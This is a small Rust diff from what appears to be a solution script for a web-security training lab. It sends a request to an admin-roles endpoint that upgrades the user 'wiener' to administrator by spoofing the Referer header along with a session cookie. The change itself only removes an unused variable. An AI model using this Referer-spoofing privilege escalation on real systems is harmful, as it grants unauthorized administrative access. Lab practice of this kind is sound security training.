@@ -62,7 +62,7 @@ fn main() {
     io::stdout().flush();
 
     // upgrade wiener to be an admin by adding Referer header
-    let upgrade_wiener = client
+    client
         .get(format!("{url}/admin-roles?username=wiener&action=upgrade"))
         .header("Cookie", format!("session={session}"))
         .header("Referer", format!("{url}/admin"))
